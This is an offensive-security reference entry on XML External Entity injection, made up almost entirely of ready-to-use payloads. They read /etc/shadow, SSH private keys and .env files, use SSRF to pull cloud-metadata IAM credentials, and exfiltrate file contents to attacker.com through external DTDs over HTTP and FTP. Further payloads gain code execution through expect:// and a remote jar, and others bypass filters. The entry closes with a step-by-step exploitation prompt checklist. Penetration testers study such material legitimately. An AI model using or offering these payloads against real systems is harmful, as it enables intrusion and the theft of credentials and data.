---
id: "xxe"
title: "XML External Entity (XXE) Injection"
type: "technique"
category: "web-application"
subcategory: "xxe"
tags: ["xxe", "xml", "file-read", "ssrf", "oob", "blind", "dtd", "owasp"]
difficulty: "intermediate"
platforms: ["linux", "macos", "windows"]
related: ["ssrf-techniques", "ssti-payloads", "command-injection-payloads"]
updated: "2026-03-30"
---

## Overview

XXE exploits XML parsers that process external entity references. When an application parses XML input with a weakly configured parser, attackers can read local files, perform SSRF, exfiltrate data out-of-band, and sometimes achieve RCE. XXE appears in SOAP APIs, XML file uploads (DOCX, XLSX, SVG), SAML authentication, and any endpoint accepting XML.

## Classic XXE — File Read

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>
```

### Read sensitive files
```xml
<!ENTITY xxe SYSTEM "file:///etc/shadow">
<!ENTITY xxe SYSTEM "file:///home/user/.ssh/id_rsa">
<!ENTITY xxe SYSTEM "file:///proc/self/environ">
<!ENTITY xxe SYSTEM "file:///var/www/html/config.php">
<!ENTITY xxe SYSTEM "file:///app/.env">

<!-- Windows -->
<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">
<!ENTITY xxe SYSTEM "file:///c:/inetpub/wwwroot/web.config">
```

### PHP wrapper for source code (base64-encoded)
```xml
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/var/www/html/index.php">
]>
<root>&xxe;</root>
```

## XXE to SSRF

```xml
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">
]>
<root>&xxe;</root>

<!-- Internal port scanning -->
<!ENTITY xxe SYSTEM "http://192.168.1.1:22">
<!ENTITY xxe SYSTEM "http://192.168.1.1:3306">

<!-- Cloud metadata -->
<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/user-data">
<!ENTITY xxe SYSTEM "http://metadata.google.internal/computeMetadata/v1/">
```

## Blind XXE — Out-of-Band Exfiltration

When you can't see the entity value in the response.

### Step 1: Host a malicious DTD on your server (`evil.dtd`)
```xml
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?data=%file;'>">
%eval;
%exfil;
```

### Step 2: XXE payload that loads the external DTD
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">
  %xxe;
]>
<root>test</root>
```

### Exfil multi-line files via FTP
```xml
<!-- evil.dtd -->
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'ftp://attacker.com/%file;'>">
%eval;
%exfil;
```
Run an FTP listener to capture the file content in the path.

## Error-Based XXE

Force the parser to display file contents in error messages.

```xml
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
  %eval;
  %error;
]>
```

## XXE in File Uploads

### SVG files
```xml
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE test [
  <!ENTITY xxe SYSTEM "file:///etc/hostname">
]>
<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg">
  <text font-size="16" x="0" y="16">&xxe;</text>
</svg>
```

### DOCX/XLSX/PPTX (ZIP containing XML)
1. Create a normal .docx
2. Unzip it
3. Inject XXE payload into `[Content_Types].xml` or `word/document.xml`
4. Rezip as .docx
5. Upload

### SOAP requests
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
  <soapenv:Body>
    <data>&xxe;</data>
  </soapenv:Body>
</soapenv:Envelope>
```

## XXE to RCE

### PHP expect wrapper
```xml
<!ENTITY xxe SYSTEM "expect://id">
```

### Java — Jar protocol for classpath access
```xml
<!ENTITY xxe SYSTEM "jar:http://attacker.com/evil.jar!/evil.class">
```

## Filter Bypass Techniques

```xml
<!-- UTF-16 encoding (bypass UTF-8 only filters) -->
<?xml version="1.0" encoding="UTF-16"?>

<!-- Parameter entities (when regular entities are blocked) -->
<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">
%xxe;

<!-- XInclude (when you can't control DOCTYPE) -->
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include parse="text" href="file:///etc/passwd"/>
</foo>

<!-- CDATA wrapping for binary files -->
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % start "<![CDATA[">
<!ENTITY % end "]]>">
<!ENTITY % eval "<!ENTITY &#x25; all '%start;%file;%end;'>">
```

## Deep Dig Prompts

```
Given this XML-accepting endpoint [describe]:
1. Test for classic XXE with /etc/passwd or win.ini.
2. If no reflection, set up OOB exfiltration via external DTD.
3. Try XInclude if DOCTYPE is stripped.
4. Test file upload endpoints (SVG, DOCX, XLSX) for XXE.
5. Attempt SSRF to cloud metadata via XXE.
6. Check for error-based XXE by referencing nonexistent files.
```

## Tools

- **Burp Suite** — Intercept and inject XXE payloads
- **XXEinjector** — Automated XXE exploitation
- **oxml_xxe** — XXE in Office documents
- **Interactsh/Collaborator** — OOB detection
